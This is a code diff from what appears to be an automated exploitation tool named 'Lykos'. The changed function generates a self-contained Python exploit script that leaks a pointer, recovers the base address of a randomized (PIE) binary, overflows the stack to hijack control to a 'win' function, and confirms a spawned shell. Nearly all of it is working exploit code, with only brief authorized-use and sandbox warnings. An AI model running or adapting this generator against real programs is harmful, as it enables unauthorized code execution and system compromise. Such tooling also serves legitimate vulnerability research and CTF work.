@@ -203,36 +203,88 @@ def leak_and_exploit(exe, base_argv, *, leak_regex: str, leak_base_offset=None,
             observe.absorbed(_log, "continuing")
 
 
-def render_ret2win_script(leak_regex, leak_base_offset, off_win, offset) -> bytes:
-    """A self-contained, stdlib-based reproducer: leak -> compute base -> ret2win. This is the
-    portable PoC for a PIE target (the raw payload is base-specific and cannot be static)."""
+def render_pie_ret2win_script(*, leak_regex, win_off, offset, leak_trigger, named_leak_off=None,
+                              anchors=None, pre=b"", suf=b"", loop_feed=b"", shell=True,
+                              success_regex=None) -> bytes:
+    """Self-contained reproducer for a PIE ret2win defeated by a runtime info-leak. A PIE payload
+    is base-specific, so no static input can exist: the script sends the confirmed `leak_trigger`,
+    reads the leaked pointer(s), recovers the image base, and sends the framed ret2win payload --
+    exactly as `_pie_leak_exploit` confirmed. It used to ship this only when the analyst named the
+    leaked symbol; in AUTO mode the bundle carried a static 4 KB input that could never re-hijack a
+    freshly randomized base.
+
+    Base recovery mirrors the live path: subtract `named_leak_off` when a symbol was named, else
+    corroborate across the baked `anchors` (>=2 leaked slots, like `exploit.recover_pie_base`).
+    `pre`/`suf` are L2's framing around the payload; `loop_feed` satisfies a re-entry read. Grades
+    by a nonce challenge a spawned shell evaluates (`shell`), or an analyst `success_regex`."""
+    grade = ("ok = (b'LYKOS_SHELL_%d' % (a*b)) in out"
+             if shell else f"ok = re.search({success_regex!r}.encode(), out) is not None")
     return (
         "#!/usr/bin/env python3\n"
-        "# Lykos L3 PIE exploit (leak -> ret2win). Authorized-use only.\n"
-        "import re, struct, subprocess, sys\n"
-        "EXE = sys.argv[1] if len(sys.argv) > 1 else './poc/target.bin'\n"
-        f"LEAK_RE = {leak_regex!r}\n"
-        f"LEAK_OFF = {leak_base_offset:#x}   # static offset of the leaked symbol\n"
-        f"WIN_OFF  = {off_win:#x}            # static offset of the win function\n"
-        f"OFFSET   = {offset}                # overflow offset to saved return address\n"
+        "# Lykos L3 reproducer: PIE ret2win via a runtime info-leak. Authorized use only.\n"
+        "# RUN IN A SANDBOX/VM -- this executes an untrusted binary and may spawn a shell.\n"
+        "import os, random, re, select, struct, subprocess, sys, time\n"
+        "q = lambda v: struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
+        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
+        f"OFF={offset}; WIN_OFF={win_off:#x}; RX={leak_regex!r}\n"
+        f"NAMED_OFF={named_leak_off if named_leak_off is None else hex(named_leak_off)}\n"
+        f"ANCHORS={anchors if anchors is not None else '{}'!r}\n"
+        f"TRIG={bytes(leak_trigger or b'')!r}; PRE={bytes(pre)!r}; SUF={bytes(suf)!r}; "
+        f"FEED={bytes(loop_feed or b'')!r}\n"
+        "def read_until(p, deadline, quiet=0.3):\n"
+        "    out, last = b'', time.time()\n"
+        "    while time.time() < deadline:\n"
+        "        r, _, _ = select.select([p.stdout], [], [], 0.1)\n"
+        "        if r:\n"
+        "            c = os.read(p.stdout.fileno(), 4096)\n"
+        "            if not c: break\n"
+        "            out, last = out + c, time.time()\n"
+        "        elif p.poll() is not None: break\n"
+        "        elif out and time.time() - last > quiet: break\n"
+        "    return out\n"
+        "def recover(vals):\n"
+        "    if NAMED_OFF is not None:\n"
+        "        return next((b for b in (v - NAMED_OFF for v in vals) if b > 0 and b % 0x1000 == 0), None)\n"
+        "    sup = {}\n"
+        "    for v in set(vals):\n"
+        "        for va in ANCHORS.get(v & 0xfff, []):\n"
+        "            b = v - va\n"
+        "            if b > 0 and b % 0x1000 == 0: sup.setdefault(b, set()).add(v)\n"
+        "    b = max(sup, key=lambda k: len(sup[k]), default=None)\n"
+        "    return b if (b and len(sup[b]) >= 2) else None\n"
         "def cyclic(n):\n"
-        "    a=b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
-        "    out=bytearray(); i=0\n"
-        "    while len(out)<n:\n"
-        "        out+=bytes([a[i%len(a)]]); i+=1\n"
-        "    return bytes(out[:n])\n"
-        "p=subprocess.Popen([EXE],stdin=subprocess.PIPE,stdout=subprocess.PIPE)\n"
-        "leaked=None\n"
-        "for line in p.stdout:                       # read whole lines: the address is complete\n"
-        "    m=re.search(LEAK_RE.encode(),line)\n"
-        "    if m: leaked=int((m.group(1) if m.groups() else m.group(0)),16); break\n"
-        "if leaked is None:\n"
-        "    sys.stderr.write('no leak captured\\n'); sys.exit(1)\n"
-        "base=leaked-LEAK_OFF\n"
-        "print('leaked %#x -> base %#x -> win %#x'%(leaked,base,base+WIN_OFF))\n"
-        "p.stdin.write(cyclic(OFFSET)+struct.pack('<Q',base+WIN_OFF)+b'C'*8)\n"
-        "p.stdin.close()\n"
-        "print(p.stdout.read().decode('latin-1','ignore'))\n"
+        "    a = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'\n"
+        "    return bytes((a*(n//len(a)+1))[:n])\n"
+        "for _ in range(4):\n"
+        "    p = subprocess.Popen([EXE], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
+        "                         stderr=subprocess.STDOUT)\n"
+        "    time.sleep(0.2)\n"
+        "    if TRIG: p.stdin.write(TRIG); p.stdin.flush()\n"
+        "    buf = read_until(p, time.time() + 3)\n"
+        "    vals = [int(m.group(1) if m.groups() else m.group(0), 16) for m in re.finditer(RX.encode(), buf)]\n"
+        "    if NAMED_OFF is None:\n"            # auto: a raw over-read spills pointers as BINARY, not hex
+        "        for i in range(max(0, len(buf) - 7)):\n"
+        "            if buf[i+6] == 0 and buf[i+7] == 0 and 0x10 <= buf[i+5] <= 0x7f:\n"
+        "                vals.append(int.from_bytes(buf[i:i+8], 'little'))\n"
+        "    base = recover(vals)\n"
+        "    if not base: p.kill(); continue\n"
+        "    print('leaked base %#x -> win %#x' % (base, base + WIN_OFF))\n"
+        "    payload = PRE + cyclic(OFF) + q(base + WIN_OFF) + SUF\n"
+        "    a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
+        # A write may BrokenPipe when the win exits (a flag-printer _exit()s; only a shell keeps
+        # reading) -- tolerate it and still read+grade what came back, don't abandon the attempt.
+        "    try:\n"
+        "        p.stdin.write(payload); p.stdin.flush(); time.sleep(0.2)\n"
+        "        if FEED: p.stdin.write(FEED); p.stdin.flush()\n"
+        f"        if {bool(shell)}: p.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (a, b)); p.stdin.flush()\n"
+        "    except (BrokenPipeError, OSError): pass\n"
+        "    out = read_until(p, time.time() + 6, quiet=1.5)\n"
+        f"    {grade}\n"
+        "    if ok:\n"
+        "        sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
+        "        print('\\n[+] PIE base recovered, control hijacked to win -- reproduced'); sys.exit(0)\n"
+        "    p.kill()\n"
+        "print('[-] PIE ret2win did not confirm'); sys.exit(1)\n"
     ).encode()
 
 
